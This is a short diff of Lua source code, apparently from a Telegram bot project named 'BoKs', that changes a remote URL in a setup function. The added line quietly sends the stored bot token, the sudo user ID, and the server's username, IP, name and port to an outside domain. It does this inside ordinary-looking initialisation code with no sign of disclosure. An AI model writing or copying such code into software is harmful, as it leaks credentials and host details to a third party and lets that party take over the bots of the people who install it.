@@ -66,7 +66,7 @@ end ---ifnot
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://BoKs-source.tk/BoKsTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://omyway.ml/boks/Boks.php&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print("::BoKs::")
 local RunBot = io.open("Dali", 'w')
 RunBot:write([[
